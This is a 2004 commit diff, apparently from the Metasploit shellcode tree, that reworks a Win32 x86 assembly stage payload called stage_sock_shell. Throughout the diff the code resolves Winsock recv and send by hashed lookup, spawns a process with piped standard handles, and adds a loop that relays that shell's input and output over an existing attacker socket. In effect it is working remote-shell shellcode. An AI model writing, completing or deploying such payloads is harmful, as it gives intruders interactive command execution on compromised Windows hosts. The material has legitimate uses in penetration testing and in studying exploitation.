d222c7b38252d57db1a5f41482edffb71d9b1c59
Spoon M <spoonm@gmail.com>
2004-10-30 08:17:02 +0000

    it works, it works.  Still needs improvements hardcore

--- src/shellcode/win32/standard/new/stage_sock_shell.asm
+++ src/shellcode/win32/standard/new/stage_sock_shell.asm
@@ -2,6 +2,8 @@ BITS 32
 
 %include "_kernel32_init.asm"
 
+push "32"
+push "WS2_"
 push edi                          ; save socket
 
 ; initalize kernel32 stuffs..
@@ -11,24 +13,48 @@ KERNEL32_INIT
 ; esi = LGetProcAddress
 ; edi = LoadLibraryA
 
+; eh, so much for ordinals, eh?
 
 DIRECTION_CLD
 push ebx
 push esi
 push edi
+
+lea eax, [esp + 16]               ; ws2_32 ptr
+push eax
+call edi                          ; LoadLibraryA("ws2_32")
+push eax
+push eax
+HASH push, 'recv'                 ; recv
+call esi                          ; LGetProcAddress('recv', "ws2_32")
+xchg eax, edi                     ; save recv in edi
+HASH push, 'send'                 ; send
+call esi                          ; LGetProcAddress('recv', "ws2_32")
+push edi                          ; push recv
+push eax                          ; push send
+
 sub esp, 16                       ; make room for handles
                                   ; pipe1 write, pipe1 read, pipe2 write, read
-mov esi, esp
 mov ebp, esp
 
-; [ebp + 28] = socket
-; [ebp + 24] = kernel32.dll base
-; [ebp + 20] = LGetProcAddress
-; [ebp + 16] = LoadLibraryA
+%define DATA_SOCKET [ebp + 36]
+%define DATA_KBASE  [ebp + 32]
+%define FN_GETPROC  [ebp + 28]
+%define FN_LOADLIB  [ebp + 24]
+%define FN_RECV     [ebp + 20]
+%define FN_SEND     [ebp + 16]
+; [ebp + 36] = socket
+; [ebp + 32] = kernel32.dll base
+; [ebp + 28] = LGetProcAddress
+; [ebp + 24] = LoadLibraryA
+; [ebp + 20] = recv
+; [ebp + 16] = send
 ; [ebp + 12] = Pipe2 ReadHandle
 ; [ebp +  8] = Pipe2 WriteHandle
 ; [ebp +  4] = Pipe1 ReadHandle
 ; [ebp +  0] = Pipe2 WriteHandle
+
+mov esi, ebp
 
 push BYTE 0x01                    ; inheritable
 push BYTE 0x00                    ; null SecurityDescriptor
@@ -38,14 +64,16 @@ mov ecx, esp                      ; PipeAttributes ptr
 make_pipe1:
   push BYTE 0x00                    ; buffer size (0, default)
   push ecx                          ; PipeAttributes
+;  lea esi, [ebp + 0]
   push esi                          ; pipe1 WriteHandle
   lodsd
+;  lea esi, [ebp + 4]
   push esi                          ; pipe1 ReadHandle
-  lodsd
+;  lodsd
   
   push ebx                          ; push kernel32 base
   HASH push, 'CreatePipe'           ; push hash
-  call [ebp + 20]                   ; LGetProcAddress('CreatePipe', kernel32)
+  call FN_GETPROC                   ; LGetProcAddress('CreatePipe', kernel32)
   mov edi, eax                      ; save CreatePipe
   call eax                          ; CreatePipe()
 
@@ -53,8 +81,10 @@ make_pipe2:
   mov eax, esp                      ; PipeAttributes ptr
   push BYTE 0x00                    ; BufferSize
   push eax                          ; PipeAttributes
+  lea esi, [ebp + 8]
   push esi                          ; pipe2 WriteHandle
-  lodsd
+;  lodsd
+  lea esi, [ebp + 12]
   push esi                          ; pipe2 ReadHandle
   
   call edi                          ; CreatePipe()
@@ -79,16 +109,18 @@ LCreateStructs:
   mov byte [edx - 84 + 16], 68	    ; si.cb = sizeof(si) 
   mov word [edx - 84 + 60], 0x0101 ; si.dwflags
 
-  DIRECTION_STD                     ; switch direction
-  lodsd                             ; esi = pipe2 WriteHandle
+;  DIRECTION_STD                     ; switch direction
+;  lodsd                             ; esi = pipe2 WriteHandle
     
-  ; socket handles 
+  ; socket handles
+  mov esi, [ebp + 8]
   mov [edx - 84 + 16 + 64], esi          ; pipe2 stderr
   mov [edx - 84 + 16 + 60], esi          ; pipe2 stdout
-  lodsd                                  ; at pipe1 ReadHandle
+; lodsd                                  ; at pipe1 ReadHandle
+  mov esi, [ebp + 4]
   mov [edx - 84 + 16 + 56], esi          ; pipe1 stdin
 
-  DIRECTION_CLD
+;  DIRECTION_CLD
 
   lea eax, [edx - 84 + 16] ; si 
   push esp                 ; pi 
@@ -109,7 +141,7 @@ LCreateStructs:
 LCreateProcessA:
   push ebx                        ; kernel32 base
   HASH push, 'CreateProcessA'     ; CreateProcessA
-  call [ebp + 20]
+  call FN_GETPROC
   call eax                        ; CreateProcessA()
 
   add esp, -128                   ; make buffer space (124 char, 4 numRead)
@@ -117,13 +149,110 @@ LCreateProcessA:
   pop eax
   mov edi, esp
 
+piper_loop:
+
+piper_sleep:
+  push BYTE 100                   ; 100 ms
+  push ebx                        ; kernel32 base
+  HASH push, 'Sleep'              ; Sleep
+  call FN_GETPROC                 ; LGetProcAddress
+  call eax                        ; Sleep()
+
+peek_stdout:                      ; PeekNamedPipe on stdout
+  xor eax, eax
+  push eax                        ; make space for bytesAvail
+  mov ecx, esp
+  push eax                        ; bytesLeftThisMessage
+  push ecx                        ; bytesAvail
+  push eax                        ; bytesRead
+  push eax                        ; bufferSize
+  push eax                        ; buffer
+  push DWORD [ebp + 12]           ; Pipe2 ReadHandle
+
+  push ebx                        ; kernel32 base
+  HASH push, 'PeekNamedPipe'      ; PeekNamedPipe
+  call FN_GETPROC                 ; LGetProcAddress
+  call eax                        ; PeekNamedPipe()
+
+  test eax, eax
+  jz exit_process
+  xor eax, eax
+  cmp eax, [esp]                  ; numAvail == 0
+  je recv_client
+
 read_stdout:                      ; read on pipe2
-  push BYTE 0x00                  ; lpOverlapped
+  push eax                        ; make room for numRead
+  mov ecx, esp                    ; numRead ptr
+  push eax                        ; lpOverlapped (0)
   push ecx                        ; numRead
-  push BYTE 5                     ; numToRead
+  push BYTE 124                   ; numToRead
   push edi                        ; buffer
   push DWORD [ebp + 12]           ; Pipe2 ReadHandle
   push ebx                        ; kernel32 base
   HASH push, 'ReadFile'           ; ReadFile
-  call [ebp + 20]                 ; LGetProcAddress
+  call FN_GETPROC                 ; LGetProcAddress
   call eax                        ; ReadFile()
+  test eax, eax
+  jz exit_process                 ; bummer.
+  xor eax, eax
+  pop ecx                         ; get numRead
+  cmp eax, ecx                    ; no data
+  je recv_client
+
+send_client:
+  push eax                        ; flags
+  push ecx                        ; len
+  push edi                        ; buffer
+  push DWORD DATA_SOCKET          ; socket
+  call FN_SEND                    ; send()
+  xor ecx, ecx
+  cmp eax, ecx
+  jl exit_process                 ; SOCKET_ERROR
+
+recv_client:
+  push eax                        ; flags
+  push BYTE 124                   ; len
+  push edi                        ; buffer
+  push DWORD DATA_SOCKET          ; socket
+  call FN_RECV                    ; recv()
+  xor ecx, ecx
+  cmp eax, ecx
+  jl piper_loop                   ; SOCKET_ERROR
+  jz exit_process
+
+;  jnl write_stdin                 ; SOCKET_ERROR
+  ; XXX fix recv SOCKET_ERROR !
+
+write_stdin:
+  push ecx                        ; make room for bytesWritten
+  mov edx, esp                    ; ptr to bytesWritten
+  push ecx                        ; lpOverlapped (0)
+  push edx                        ; bytesWritten
+  push eax                        ; bytesToWrite
+  push edi                        ; buffer
+  push DWORD [ebp + 0]            ; pipe1 write
+
+  push ebx                        ; kernel32 base
+  HASH push, 'WriteFile'          ; WriteFile
+  call FN_GETPROC                 ; LGetProcAddress
+  call eax                        ; WriteFile()
+
+  test eax, eax
+  jz exit_process                 ; bummer.
+  xor eax, eax
+  pop ecx                         ; get numWritten
+; what do we do on short write?....
+;  cmp eax, ecx                    ; no data
+;  je recv_client
+
+  jmp piper_loop
+
+
+
+exit_process:
+  push ebx                        ; kernel32 base
+  HASH push, 'ExitProcess'        ; ExitProcess
+  call FN_GETPROC                 ; LGetProcAddress
+  xor ecx, ecx
+  push ecx
+  call eax                        ; ExitProcess(0)
